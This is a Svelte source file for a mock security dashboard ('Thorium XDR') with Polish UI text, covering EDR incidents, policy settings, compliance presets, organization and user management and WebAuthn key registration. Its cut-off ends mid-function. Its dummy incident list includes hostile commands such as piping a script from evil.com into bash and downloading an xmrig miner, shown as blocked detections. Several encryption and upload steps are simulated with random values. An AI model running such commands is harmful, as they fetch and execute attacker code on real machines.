<script lang="ts">
  import { onMount } from "svelte";
  import { getWallets } from "@mysten/wallet-standard";
  import VMManager from "./VMManager.svelte";

  // Dummy data representing Sui Smart Contract state
  let agents = [
    {
      id: "0x1a2b...3c4d",
      hwHash: "blake3:4110df0...",
      status: "Active",
      load: 12,
    },
    {
      id: "0x9f8e...7d6c",
      hwHash: "blake3:9281bc9...",
      status: "Isolated",
      load: 0,
    },
    {
      id: "0x4b5c...6a7b",
      hwHash: "blake3:1100df1...",
      status: "Active",
      load: 45,
    },
  ];

  let incidents = [
    {
      id: "INC-991",
      agent: "0x1a2b...3c4d",
      severity: "CRITICAL",
      cmd: "curl -s http://evil.com/sh | bash",
      action: "KILLED_AND_ISOLATED",
      time: "Just now",
    },
    {
      id: "INC-990",
      agent: "0x4b5c...6a7b",
      severity: "WARNING",
      cmd: "nmap -sV 10.0.0.0/24",
      action: "BLOCKED",
      time: "2 mins ago",
    },
    {
      id: "INC-989",
      agent: "0x9f8e...7d6c",
      severity: "HIGH",
      cmd: "wget http://miner.pool/xmrig",
      action: "KILLED_AND_ISOLATED",
      time: "1 hr ago",
    },
  ];

  let address = "0xa::edr_registry";

  // Active nav tab
  let activeTab: "overview" | "vms" | "incidents" | "endpoints" | "talus" | "vulnerabilities" | "polonium" = "overview";

  // Polonium Policy Console State Variables
  let poloniumMinHashes = 100;
  let poloniumMaxHashes = 1000;
  let localAIEnabled = true;
  let savingPoloniumConfig = false;
  let poloniumStatusMessage = "";
  
  let poloniumLifespan = "30"; // "1" (min), "30" (days), "90" (days), "expired" (test)
  let poloniumExpiryTimestamp = Date.now() + 30 * 24 * 60 * 60 * 1000;

  // Walrus & Foka Polonium Cryptographic state
  let walrusBlobId = "walrus:blob:0x9f2a3c748e0b";
  let policyHash = "0x7f1a3f5b8c9d0e21a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6";
  let fokaKeyStatus = "Połączono (Zaszyfrowano Foką)";

  // Compliance / Regulatory template state
  let selectedComplianceTemplate = "custom";
  let dataRestEncryption = "AES-256-GCM";
  let networkEncryption = "TLS-1.3";
  let incidentResponseGroups = "security-admins, soc-core";
  let updateMaxDelayDays = 14;
  let auditLogRetentionDays = 90;
  let vulnScanCycle = "daily";
  let tamperProtection = true;

  const compliancePresets = {
    nis2: {
      minHashes: 180,
      maxHashes: 1500,
      localAI: true,
      dataRest: "AES-256-GCM",
      network: "TLS-1.3",
      irGroups: "nis2-responders, security-admins",
      patchDelay: 7,
      logRetention: 365,
      vulnCycle: "12h",
      tamper: true
    },
    rodo: {
      minHashes: 100,
      maxHashes: 800,
      localAI: true,
      dataRest: "AES-256-GCM",
      network: "TLS-1.3",
      irGroups: "dpo-team, security-admins",
      patchDelay: 14,
      logRetention: 730,
      vulnCycle: "daily",
      tamper: false
    },
    soc2: {
      minHashes: 150,
      maxHashes: 1200,
      localAI: true,
      dataRest: "AES-256-GCM",
      network: "TLS-1.3",
      irGroups: "soc-leads, admin",
      patchDelay: 10,
      logRetention: 90,
      vulnCycle: "12h",
      tamper: true
    },
    hipaa: {
      minHashes: 200,
      maxHashes: 1000,
      localAI: true,
      dataRest: "AES-256-GCM",
      network: "TLS-1.3",
      irGroups: "hipaa-officers, security-admins",
      patchDelay: 5,
      logRetention: 2190, // 6 years compliance
      vulnCycle: "12h",
      tamper: true
    },
    pcidss: {
      minHashes: 250,
      maxHashes: 1800,
      localAI: true,
      dataRest: "AES-256-GCM",
      network: "TLS-1.3",
      irGroups: "pci-compliance, soc-core",
      patchDelay: 3, // PCI critical patch rule
      logRetention: 365,
      vulnCycle: "12h",
      tamper: true
    },
    dora: {
      minHashes: 160,
      maxHashes: 1400,
      localAI: true,
      dataRest: "ChaCha20-Poly1305",
      network: "TLS-1.3",
      irGroups: "dora-compliance, incident-response-leads",
      patchDelay: 7,
      logRetention: 1825, // 5 years operational logs
      vulnCycle: "12h",
      tamper: true
    }
  };

  const applyCompliancePreset = (presetKey) => {
    selectedComplianceTemplate = presetKey;
    const preset = compliancePresets[presetKey];
    if (preset) {
      poloniumMinHashes = preset.minHashes;
      poloniumMaxHashes = preset.maxHashes;
      localAIEnabled = preset.localAI;
      dataRestEncryption = preset.dataRest;
      networkEncryption = preset.network;
      incidentResponseGroups = preset.irGroups;
      updateMaxDelayDays = preset.patchDelay;
      auditLogRetentionDays = preset.logRetention;
      vulnScanCycle = preset.vulnCycle;
      tamperProtection = preset.tamper;
    }
  };

  // Fetch real on-chain transaction events from Sui Testnet RPC
  const fetchOnChainPolicyTransactions = async () => {
    const packageId = "0x7c493f5b8c9d0e21a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6"; 
    const rpcUrl = "https://fullnode.testnet.sui.io:443";
    
    try {
      const response = await fetch(rpcUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "suix_queryEvents",
          params: [
            {
              MoveEventType: `${packageId}::polonium_policy::PolicyUpdated`
            },
            null, // cursor
            10, // limit
            true // descending
          ]
        })
      });
      
      if (response.ok) {
        const result = await response.json();
        if (result.result && Array.isArray(result.result.data) && result.result.data.length > 0) {
          const onChainLogs = result.result.data.map(event => {
            const parsedJson = event.parsedJson || {};
            const timestampMs = parseInt(event.timestampMs);
            return {
              time: isNaN(timestampMs) ? new Date().toLocaleTimeString() : new Date(timestampMs).toLocaleTimeString(),
              tx: event.id.txDigest.substring(0, 10) + "...",
              desc: `Zapisano politykę na Walrus (Blob ID: ${parsedJson.walrus_blob_id ? parsedJson.walrus_blob_id.substring(0, 14) + "..." : 'n/a'}) i zsynchronizowano on-chain`,
              status: "SUCCESS",
              details: {
                minHashes: parseInt(parsedJson.min_malware_hashes) || 120,
                maxHashes: parseInt(parsedJson.max_malware_hashes) || 1200,
                localAI: parsedJson.local_behavioral_ai_enabled !== undefined ? parsedJson.local_behavioral_ai_enabled : true,
                expiry: parseInt(parsedJson.expires_at_ms) || (Date.now() + 30 * 24 * 60 * 60 * 1000),
                walrusBlob: parsedJson.walrus_blob_id || "walrus:blob:placeholder",
                policyHash: "0x" + (parsedJson.policy_hash || "7f1a3f5b8c9d0e21a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6")
              }
            };
          });
          poloniumLogs = onChainLogs;
          return;
        }
      }
    } catch (e) {
      console.error("Failed fetching on-chain events:", e);
    }
    
    // Fallback if network fails / package not fully published yet
    const savedLogs = localStorage.getItem("poloniumLogs");
    if (savedLogs) {
      try {
        poloniumLogs = JSON.parse(savedLogs);
      } catch (e) {}
    }
    if (poloniumLogs.length === 0) {
      poloniumLogs = [
        {
          time: "12:00:00",
          tx: "0xb7c8...92fa",
          desc: "PoloniumConfig shared object initialized on Sui Testnet",
          status: "SUCCESS",
          details: {
            minHashes: 100,
            maxHashes: 1000,
            localAI: true,
            expiry: 1783300000000,
            walrusBlob: "walrus:blob:placeholder_polonium_config_v1",
            policyHash: "0x7f1a3f5b8c9d0e21a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6"
          }
        }
      ];
    }
  };
  
  $: poloniumExpiryDateString = new Date(poloniumExpiryTimestamp).toLocaleString("pl-PL", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit"
  });

  $: isPoloniumExpired = poloniumExpiryTimestamp < Date.now();

  // Dynamic risk-based expiration calculator (Experimental)
  $: dynamicExpirationDays = incidents.some(i => i.severity === "CRITICAL") 
    ? 1 
    : incidents.some(i => i.severity === "HIGH") 
      ? 7 
      : 30;

  // Selected policy audit modal state
  let selectedAuditLog = null;

  const getLogDetails = (log) => {
    if (log && log.details) return log.details;
    // Default fallback values for legacy logs
    return {
      minHashes: 100,
      maxHashes: 1000,
      localAI: true,
      expiry: Date.now() + 30 * 24 * 60 * 60 * 1000,
      walrusBlob: "walrus:blob:placeholder_polonium_config_v1",
      policyHash: "0x7f1a3f5b8c9d0e21a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6",
      complianceTemplate: "custom",
      dataRest: "AES-256-GCM",
      network: "TLS-1.3",
      irGroups: "security-admins, soc-core",
      patchDelay: 14,
      logRetention: 90,
      vulnCycle: "daily",
      tamper: true
    };
  };

  const restoreSelectedPolicy = () => {
    if (selectedAuditLog) {
      const details = getLogDetails(selectedAuditLog);
      poloniumMinHashes = details.minHashes;
      poloniumMaxHashes = details.maxHashes;
      localAIEnabled = details.localAI;
      walrusBlobId = details.walrusBlob;
      policyHash = details.policyHash;
      poloniumExpiryTimestamp = details.expiry;
      selectedComplianceTemplate = details.complianceTemplate || "custom";
      dataRestEncryption = details.dataRest || "AES-256-GCM";
      networkEncryption = details.network || "TLS-1.3";
      incidentResponseGroups = details.irGroups || "security-admins, soc-core";
      updateMaxDelayDays = details.patchDelay || 14;
      auditLogRetentionDays = details.logRetention || 90;
      vulnScanCycle = details.vulnCycle || "daily";
      tamperProtection = details.tamper !== undefined ? details.tamper : true;
      
      // Auto-detect matching presets if any, else keep manual
      if (poloniumExpiryTimestamp > Date.now()) {
        const diffMin = Math.round((poloniumExpiryTimestamp - Date.now()) / 60000);
        if (diffMin <= 2) {
          poloniumLifespan = "1";
        }
      }
      
      selectedAuditLog = null;
    }
  };

  // Helium & Hydrogen State Variables
  let heliumOrganizations = [
    {
      id: "0x8a1c9e2b4f0a7c6d8e9f2a3c748e0b1d2e3f4a5b",
      name: "Talus CyberSecurity Corp",
      orgCode: "TCSC",
      legalForm: "Sp. z o.o.",
      region: "PL",
      creator: "0x3b8d9c2e1f0a7c6d8e9f2a3c748e0b1d2e3f4a5b",
      poloniumPolicyId: "0x7c493f5b8c9d0e21a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6",
      requireHardware: false,
      masterKeys: []
    }
  ];
  let selectedOrgIndex = 0;

  // EU Regions for org creation
  const euRegions = [
    { code: "PL", name: "Polska", flag: "🇵🇱", vatPrefix: "PL", taxId: "NIP", regId: "KRS" },
    { code: "US", name: "USA", flag: "🇺🇸", vatPrefix: "US", taxId: "EIN", regId: "State Registry" },
    { code: "CA", name: "Kanada", flag: "🇨🇦", vatPrefix: "CA", taxId: "BN/NE", regId: "Corporate Number" },
    { code: "GB", name: "UK", flag: "🇬🇧", vatPrefix: "GB", taxId: "VAT No", regId: "CRN (Companies House)" },
    { code: "IS", name: "Islandia", flag: "🇮🇸", vatPrefix: "IS", taxId: "Kennitala", regId: "Fyrirtækjaskrá" },
    { code: "NO", name: "Norwegia", flag: "🇳🇴", vatPrefix: "NO", taxId: "MVA-nummer", regId: "Organisasjonsnummer" },
    { code: "CH", name: "Szwajcaria", flag: "🇨🇭", vatPrefix: "CHE", taxId: "UID / MWST", regId: "Handelsregisternummer" },
    { code: "EU", name: "UE", flag: "🇪🇺", vatPrefix: "EU", taxId: "EU VAT", regId: "EU ID" }
  ];

  const legalFormsByRegion = {
    PL: ["Jednoosobowa Działalność Gospodarcza (JDG)", "Spółka z o.o. (Sp. z o.o.)", "Prosta Spółka Akcyjna (P.S.A.)", "Spółka Akcyjna (S.A.)", "Spółka Jawna (S.J.)", "Spółka Partnerska (S.S.P.)", "Fundacja", "Stowarzyszenie"],
    US: ["LLC (Limited Liability Company)", "C-Corp (C Corporation)", "S-Corp (S Corporation)", "Sole Proprietorship", "Partnership"],
    CA: ["Corporation", "Sole Proprietorship", "Partnership", "Cooperative"],
    GB: ["Ltd (Private Limited Company)", "Plc (Public Limited Company)", "Sole Trader", "LLP (Limited Liability Partnership)"],
    IS: ["Ehf. (Einkahlutafélag)", "Hf. (Hlutafélag)", "Sf. (Sameignarfélag)", "Einstaklingsfyrirtæki"],
    NO: ["AS (Aksjeselskap)", "ASA (Allment aksjeselskap)", "ENK (Enkeltpersonforetak)", "ANS/DA (Ansvarlig selskap)"],
    CH: ["GmbH / Sàrl", "AG / SA", "Einzelfirma / Entreprise individuelle", "Kollektivgesellschaft"],
    EU: ["SE (Societas Europaea)", "EEIG (European Economic Interest Grouping)", "SCE (European Cooperative Society)"],
    DEFAULT: ["Ltd", "GmbH", "SAS", "Sole Trader", "Other"]
  };

  // New Organization fields
  let showAddOrgModal = false;
  let newOrgName = "";
  let newOrgCode = "";
  let newOrgRegion = "PL";
  let newOrgLegalForm = "Spółka z o.o. (Sp. z o.o.)";
  let newOrgTaxId = "";
  let newOrgRegId = "";
  let newOrgRequireHardware = false;
  let newOrgMasterKeys = ["", ""];
  let newOrgCredentialIds = ["", ""];
  let newOrgHardwareError = "";
  let krsVerifyState = null; // null | 'loading' | { ok, name, address, status, date }

  $: {
    if (!showAddOrgModal) {
      newOrgMasterKeys = ["", ""];
      newOrgCredentialIds = ["", ""];
      newOrgHardwareError = "";
    }
  }

  $: selectedRegion = euRegions.find(r => r.code === newOrgRegion) || euRegions[0];
  $: availableLegalForms = legalFormsByRegion[newOrgRegion] || legalFormsByRegion.DEFAULT;
  $: { if (newOrgRegion) { newOrgLegalForm = (legalFormsByRegion[newOrgRegion] || legalFormsByRegion.DEFAULT)[1] || (legalFormsByRegion[newOrgRegion] || legalFormsByRegion.DEFAULT)[0]; krsVerifyState = null; } }
  $: hasDuplicateMasterKeys = newOrgRequireHardware && (
    newOrgMasterKeys.filter(k => k.trim().length > 0).length > new Set(newOrgMasterKeys.filter(k => k.trim().length > 0).map(k => k.trim().toLowerCase())).size
  );

  function detectRegionFromVat(vatNumber) {
    const upper = vatNumber.toUpperCase().trim();
    const match = euRegions.find(r => upper.startsWith(r.vatPrefix));
    if (match) newOrgRegion = match.code;
  }

  let registeringKeyIndex = null;
  let registeringKeyTarget = null;
  let hardwareRegisterType = null;
  let isRegisteringHardware = false;

  async function registerHardwareKey(type, target, index = null) {
    isRegisteringHardware = true;
    hardwareRegisterType = type;
    
    try {
      newOrgHardwareError = ""; // Clear previous errors
      // Generate standard random challenge and user ID
      const challenge = new Uint8Array(32);
      window.crypto.getRandomValues(challenge);
      
      const userId = new Uint8Array(16);
      window.crypto.getRandomValues(userId);

      const excludeList = [];
      if (target === 'org' && index !== null) {
        for (let i = 0; i < newOrgCredentialIds.length; i++) {
          if (i !== index && newOrgCredentialIds[i]) {
            // Convert rawIdHex back to Uint8Array/ArrayBuffer
            const hex = newOrgCredentialIds[i];
            const bytes = new Uint8Array(hex.match(/[\da-f]{2}/gi).map(h => parseInt(h, 16)));
            excludeList.push({
              id: bytes.buffer,
              type: 'public-key'
            });
          }
        }
      }

      const publicKeyOptions = {
        challenge: challenge,
        rp: {
          name: "Thorium XDR",
          id: window.location.hostname
        },
        user: {
          id: userId,
          name: target === 'user' ? (newUserName || "user@thorium.local") : `masterkey_${index || 0}@thorium.local`,
          displayName: target === 'user' ? (newUserName || "Thorium User") : `Master Key ${(index || 0) + 1}`
        },
        pubKeyCredParams: [
          { alg: -7, type: "public-key" }, // ES256
          { alg: -257, type: "public-key" } // RS256
        ],
        authenticatorSelection: {
          authenticatorAttachment: "cross-platform", // Force external security keys (YubiKey/Ledger/etc.)
          userVerification: "discouraged" // Do not require PIN / biometrics unless configured
        },
        excludeCredentials: excludeList,
        timeout: 60000
      };

      const credential = await navigator.credentials.create({
        publicKey: publicKeyOptions
      });

      if (credential) {
        // Retrieve the actual Public Key DER bytes using the standard WebAuthn API
        let hexKey = "";
        if (credential.response && typeof credential.response.getPublicKey === 'function') {
          const pubKeyBuffer = credential.response.getPublicKey();
          const pubKeyBytes = new Uint8Array(pubKeyBuffer);
          hexKey = "0x" + Array.from(pubKeyBytes).map(b => b.toString(16).padStart(2, '0')).join('');
        } else {
          // Fallback to rawId if getPublicKey is not supported by the client browser/authenticator
          const rawIdBytes = new Uint8Array(credential.rawId);
          hexKey = "0x" + Array.from(rawIdBytes).map(b => b.toString(16).padStart(2, '0')).join('');
        }

        const rawIdBytes = new Uint8Array(credential.rawId);
        const rawIdHex = Array.from(rawIdBytes).map(b => b.toString(16).padStart(2, '0')).join('');
        
        if (target === 'user') {
          newUserKey = hexKey;
        } else if (target === 'org') {
          newOrgMasterKeys = newOrgMasterKeys.map((k, idx) => idx === index ? hexKey : k);
          newOrgCredentialIds = newOrgCredentialIds.map((c, idx) => idx === index ? rawIdHex : c);
        }
      }
    } catch (err) {
      console.error("WebAuthn Registration Error:", err);
      if (err.name === 'InvalidStateError' || err.message.toLowerCase().includes('exclude') || err.message.toLowerCase().includes('already registered')) {
        newOrgHardwareError = "Nie można dodać dwa razy tego samego klucza fizycznego. Podłącz i zarejestruj inny, fizyczny klucz (np. klucz zapasowy).";
        alert("Błąd: Nie można dodać dwa razy tego samego klucza fizycznego! Podłącz i zarejestruj inny, fizyczny klucz (np. klucz zapasowy).");
      } else {
        newOrgHardwareError = "Błąd rejestracji klucza sprzętowego: " + err.message;
        alert("Błąd rejestracji klucza sprzętowego: " + err.message);
      }
    } finally {
      isRegisteringHardware = false;
      hardwareRegisterType = null;
    }
  }

  async function handleVerifyKRS() {
    if (!newOrgTaxId && !newOrgRegId) return;
    krsVerifyState = 'loading';
    await new Promise(r => setTimeout(r, 1200)); // simulate API call
    // Simulated KRS result for demo
    krsVerifyState = {
      ok: true,
      name: newOrgName || "QUANTURITY SPÓŁKA Z OGRANICZONĄ ODPOWIEDZIALNOŚCIĄ",
      address: "KAZIMIERA WIELKIEGO 1/3, 20-611 LUBLIN",
      status: "AKTYWNY (Płatnik VAT czynny)",
      date: "13.10.2025"
    };
    if (!newOrgName && krsVerifyState.ok) newOrgName = krsVerifyState.name;
    if (!newOrgCode && krsVerifyState.ok) newOrgCode = krsVerifyState.name.split(' ')[0];
  }

  const handleCreateOrg = () => {
    if (!newOrgName || !newOrgCode) return;
    if (newOrgRequireHardware) {
      const validKeys = newOrgMasterKeys.filter(k => k.trim().length > 0);
      if (validKeys.length < 2) {
        alert("Wymagane jest podanie minimum dwóch kluczy głównych (Master Keys) w przypadku włączenia uwierzytelnienia sprzętowego.");
        return;
      }
      const uniqueKeys = new Set(validKeys.map(k => k.trim().toLowerCase()));
      if (uniqueKeys.size < validKeys.length) {
        alert("Błąd: Wykryto zduplikowane klucze! Każdy z kluczy głównych (Master Keys) musi być innym, fizycznym urządzeniem (np. dwoma różnymi kluczami YubiKey/Ledger). Jeśli użyto tego samego klucza dwukrotnie, ich identyfikatory (rawId) będą identyczne.");
        return;
      }
    }
    heliumOrganizations = [
      ...heliumOrganizations,
      {
        id: "0x" + Math.random().toString(16).substr(2, 40),
        name: newOrgName,
        orgCode: newOrgCode,
        legalForm: newOrgLegalForm,
        region: newOrgRegion,
        taxId: newOrgTaxId,
        requireHardware: newOrgRequireHardware,
        masterKeys: newOrgRequireHardware ? newOrgMasterKeys.filter(k => k.trim().length > 0) : [],
        creator: address,
        poloniumPolicyId: "0x7c493f5b8c9d0e21a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6"
      }
    ];
    selectedOrgIndex = heliumOrganizations.length - 1;
    newOrgName = ""; newOrgCode = ""; newOrgTaxId = ""; newOrgRegId = "";
    newOrgRegion = "PL"; newOrgRequireHardware = false; krsVerifyState = null;
    newOrgMasterKeys = ["", ""];
    newOrgCredentialIds = ["", ""];
    newOrgHardwareError = "";
    showAddOrgModal = false;
  };


  let hydrogenUsers = [
    { id: "0xusr_1", username: "j.godula", email: "j.godula@talus.corp", role: "SuperAdmin", key: "0x8b3f5c...e1a2", status: "Active" },
    { id: "0xusr_2", username: "a.kowalski", email: "a.kowalski@talus.corp", role: "Operator", key: "0x3c7e9a...f5d1", status: "Active" },
    { id: "0xusr_3", username: "m.nowak", email: "m.nowak@talus.corp", role: "Guest", key: "0x9a8b7c...2c3d", status: "Suspended" },
    { id: "0xusr_4", username: "sec-analyst", email: "soc@talus.corp", role: "SecurityAdmin", key: "0x7e2d1c...b1a0", status: "Active" }
  ];

  let hydrogenDevices = [
    { id: "0xdev_1", deviceId: "node-server-01", type: "Server", os: "AlmaLinux 9.4", mac: "00:1A:2B:3C:4D:5E", ip: ["10.0.1.15", "84.22.105.12"], agent: "v2.4.1", status: "Safe", lastSeen: "Przed chwilą", associatedUser: "j.godula" },
    { id: "0xdev_2", deviceId: "workstation-lpt-02", type: "Laptop", os: "Windows 11 Enterprise", mac: "3C:A8:2A:1F:B5:7C", ip: ["192.168.1.104"], agent: "v2.4.1", status: "Suspicious", lastSeen: "3 minuty temu", associatedUser: "a.kowalski" },
    { id: "0xdev_3", deviceId: "smart-camera-iot-09", type: "IoT", os: "Embedded Linux", mac: "7A:B3:21:4E:9F:D0", ip: ["10.0.5.210"], agent: "v1.0.8", status: "Isolated", lastSeen: "12 minut temu", associatedUser: "Brak" },
    { id: "0xdev_4", deviceId: "db-server-main", type: "Server", os: "Ubuntu 22.04 LTS", mac: "00:25:90:3A:4C:1E", ip: ["10.0.1.16"], agent: "v2.4.0", status: "Safe", lastSeen: "Przed chwilą", associatedUser: "sec-analyst" }
  ];

  // Forms for adding
  let showAddUserModal = false;
  let newUserName = "";
  let newUserEmail = "";
  let newUserRole = "Operator";
  let newUserKey = "";

  let showAddDeviceModal = false;
  let newDeviceId = "";
  let newDeviceType = "Server";
  let newDeviceOs = "AlmaLinux 9.4";
  let newDeviceMac = "";
  let newDeviceIp = "";
  let newDeviceUser = "Brak";

  const handleAddUser = () => {
    if (!newUserName || !newUserEmail) return;
    hydrogenUsers = [
      ...hydrogenUsers,
      {
        id: "0xusr_" + (hydrogenUsers.length + 1),
        username: newUserName,
        email: newUserEmail,
        role: newUserRole,
        key: newUserKey || "0x" + Math.random().toString(16).substr(2, 8) + "...key",
        status: "Active"
      }
    ];
    newUserName = "";
    newUserEmail = "";
    newUserKey = "";
    showAddUserModal = false;
  };

  const handleAddDevice = () => {
    if (!newDeviceId) return;
    hydrogenDevices = [
      ...hydrogenDevices,
      {
        id: "0xdev_" + (hydrogenDevices.length + 1),
        deviceId: newDeviceId,
        type: newDeviceType,
        os: newDeviceOs,
        mac: newDeviceMac || "00:AA:BB:CC:DD:EE",
        ip: [newDeviceIp || "10.0.1.20"],
        agent: "v2.4.1",
        status: "Safe",
        lastSeen: "Przed chwilą",
        associatedUser: newDeviceUser
      }
    ];
    newDeviceId = "";
    newDeviceMac = "";
    newDeviceIp = "";
    showAddDeviceModal = false;
  };

  const changeDeviceStatus = (deviceId, newStatus) => {
    hydrogenDevices = hydrogenDevices.map(dev => {
      if (dev.id === deviceId) {
        return { ...dev, status: newStatus };
      }
      return dev;
    });
  };

  let poloniumLogs = [];

  $: if (typeof window !== "undefined" && poloniumLogs.length > 0) {
    localStorage.setItem("poloniumLogs", JSON.stringify(poloniumLogs));
  }

  const handleSavePoloniumConfig = () => {
    if (!isSlushConnected) {
      slushWalletAlert = "Brak autoryzacji: Musisz podłączyć portfel Slush, aby zapisać politykę Polonium on-chain.";
      return;
    }
    savingPoloniumConfig = true;
    poloniumStatusMessage = "🔒 Pobieranie klucza szyfrującego z Foka Keystore (Sui Seal)...";
    
    // Set timestamp based on lifespan selection
    let durationMs = 30 * 24 * 60 * 60 * 1000;
    if (poloniumLifespan === "1") {
      durationMs = 60 * 1000; // 1 minute
    } else if (poloniumLifespan === "90") {
      durationMs = 90 * 24 * 60 * 60 * 1000;
    } else if (poloniumLifespan === "year1") {
      durationMs = 365 * 24 * 60 * 60 * 1000; // 1 year
    } else if (poloniumLifespan === "year2") {
      durationMs = 2 * 365 * 24 * 60 * 60 * 1000; // 2 years
    } else if (poloniumLifespan === "year3") {
      durationMs = 3 * 365 * 24 * 60 * 60 * 1000; // 3 years
    } else if (poloniumLifespan === "year5") {
      durationMs = 5 * 365 * 24 * 60 * 60 * 1000; // 5 years
    } else if (poloniumLifespan === "year10") {
      durationMs = 10 * 365 * 24 * 60 * 60 * 1000; // 10 years
    } else if (poloniumLifespan === "dynamic") {
      durationMs = dynamicExpirationDays * 24 * 60 * 60 * 1000; // Risk-based dynamic days
    } else if (poloniumLifespan === "expired") {
      durationMs = -24 * 60 * 60 * 1000; // -1 day (expired)
    }
    
    const newExpiry = Date.now() + durationMs;

    setTimeout(() => {
      poloniumStatusMessage = "⚙️ Szyfrowanie polityki bezpieczeństwa (AES-GCM-256)...";
      
      setTimeout(() => {
        poloniumStatusMessage = "📦 Przesyłanie zaszyfrowanej konfiguracji do Walrus Storage protocol...";
        
        setTimeout(() => {
          // Generate new fake blob ID and hash for representation
          walrusBlobId = "walrus:blob:0x" + Math.random().toString(16).substr(2, 12) + "..." + Math.random().toString(16).substr(2, 6);
          policyHash = "0x" + Array.from({length: 64}, () => Math.floor(Math.random()*16).toString(16)).join("");
          poloniumStatusMessage = "✍️ Podpisywanie transakcji metadanych (Walrus Pointer, Hash) przez Slush Wallet...";
          
          setTimeout(() => {
            poloniumStatusMessage = "🚀 Wysyłanie metadanych do Sui Testnet (Gas paid: 0.0023 SUI)...";
            
            setTimeout(() => {
              savingPoloniumConfig = false;
              poloniumStatusMessage = "";
              poloniumExpiryTimestamp = newExpiry;
              fokaKeyStatus = "Połączono (Zaszyfrowano Foką)";
              
              poloniumLogs = [
                {
                  time: new Date().toLocaleTimeString(),
                  tx: "0x" + Math.random().toString(16).substr(2, 8) + "..." + Math.random().toString(16).substr(2, 4),
                  desc: `Zapisano politykę na Walrus i powiązano on-chain (Wygasa: ${new Date(newExpiry).toLocaleString()})`,
                  status: "SUCCESS",
                  details: {
                    minHashes: poloniumMinHashes,
                    maxHashes: poloniumMaxHashes,
                    localAI: localAIEnabled,
                    expiry: newExpiry,
                    walrusBlob: walrusBlobId,
                    policyHash: policyHash,
                    complianceTemplate: selectedComplianceTemplate,
                    dataRest: dataRestEncryption,
                    network: networkEncryption,
                    irGroups: incidentResponseGroups,
                    patchDelay: updateMaxDelayDays,
                    logRetention: auditLogRetentionDays,
                    vulnCycle: vulnScanCycle,
                    tamper: tamperProtection
                  }
                },
                ...poloniumLogs
              ];
              // Fetch/Sync with chain
              fetchOnChainPolicyTransactions();
            }, 1000);
          }, 1000);
        }, 1200);
      }, 800);
    }, 1000);
  };

  // Talus AI Inferences list
  let talusInferences = [
    {
      id: "REP-401",
      model: "XGBoost-L3-Threat",
      host: "thorium-test",
      ip: "fde4:8dba:82e1::11",
      score: 92,
      classification: "MALICIOUS",
      fokaSignature: "0xa81c2f09ef54c87b9281a1796bf4b62d81bc92ff5e43a",
      fokaStatus: "Valid (Sui Seal Verified)",
      action: "TRIGGER_ISOLATION",
      time: "Just now"
    },
    {
      id: "REP-400",
      model: "Autoencoder-Process-Anomaly",
      host: "Local Node",
      ip: "127.0.0.1",
      score: 41,
      classification: "BENIGN",
      fokaSignature: "0xd90e77c3a0b1e4cf27f09bf21a718b55d1a1b24d77cc4",
      fokaStatus: "Valid (Sui Seal Verified)",
      action: "NONE",
      time: "15 mins ago"
    },
    {
      id: "REP-399",
      model: "LSTM-Network-Sequencer",
      host: "thorium-test",
      ip: "fde4:8dba:82e1::11",
      score: 72,
      classification: "SUSPICIOUS",
      fokaSignature: "0xf2718e55c7b301a91e7c0628e819b5527a1b2a4f6d83e",
      fokaStatus: "Valid (Sui Seal Verified)",
      action: "NONE",
      time: "1 hr ago"
    }
  ];

  let anomalyThreshold = 85;
  let verificationStatus: string | null = null;
  let showFokaVerificationModal = false;
  let verifyingInferenceId: string | null = null;

  let isVulnerabilitiesDecrypted = false;
  let decryptingVulnerabilities = false;

  // Raw/Encrypted vulnerability data shown before decryption
  let encryptedVulnerabilities = [
    { id: "VULN-001", agent: "0x1a2b...3c4d", encrypted_payload: "U2FsdGVkX195N3p8W1p0OWU2d... (AES-256 Encrypted)", cvss: 9.8 },
    { id: "VULN-002", agent: "0x9f8e...7d6c", encrypted_payload: "U2FsdGVkX1+9b1M0OWU4eDEyN... (AES-256 Encrypted)", cvss: 7.5 },
    { id: "VULN-003", agent: "0x4b5c...6a7b", encrypted_payload: "U2FsdGVkX1/b2FzMTB2ODlhZDM... (AES-256 Encrypted)", cvss: 4.8 }
  ];

  // Decrypted vulnerability data revealed after Foka validation
  let decryptedVulnerabilities = [
    {
      id: "VULN-001",
      agent: "0x1a2b...3c4d",
      package: "openssl",
      manager: "RPM (dnf)",
      cve: "CVE-2026-0199",
      installed: "3.0.7-r1",
      fixed: "3.0.7-r2",
      cvss: 9.8,
      consequence: "Zdalne wykonanie kodu (RCE) w kontekście roota. Możliwe przejęcie kontroli nad węzłem."
    },
    {
      id: "VULN-002",
      agent: "0x9f8e...7d6c",
      package: "snapd",
      manager: "Snap",
      cve: "CVE-2026-1102",
      installed: "2.57.4",
      fixed: "2.58.0",
      cvss: 7.5,
      consequence: "Lokalne podniesienie uprawnień (LPE). Użytkownik w piaskownicy może uciec do hosta."
    },
    {
      id: "VULN-003",
      agent: "0x4b5c...6a7b",
      package: "curl",
      manager: "Homebrew (brew)",
      cve: "CVE-2026-4401",
      installed: "8.1.2",
      fixed: "8.2.0",
      cvss: 4.8,
      consequence: "Wyciek informacji poprzez niepoprawną weryfikację certyfikatów SSL."
    }
  ];

  // Slush Wallet Integration (Official Mysten Wallet Standard API)
  let isSlushConnected = false;
  let slushAddress = "";
  let connectingSlush = false;
  let slushWalletAlert = "";
  
  let showWalletModal = false;
  let availableWallets = [];

  let walletsApi;
  if (typeof window !== "undefined") {
    walletsApi = getWallets();
    // Listen for dynamically registered wallets
    walletsApi.on("register", () => {
      console.log("Dynamically registered wallet detected via @mysten/wallet-standard");
      scanWallets();
    });
    walletsApi.on("unregister", () => {
      scanWallets();
    });
  }

  const scanWallets = () => {
    const list = [];
    
    // 1. Fetch wallets from official @mysten/wallet-standard API
    if (walletsApi) {
      const registered = walletsApi.get();
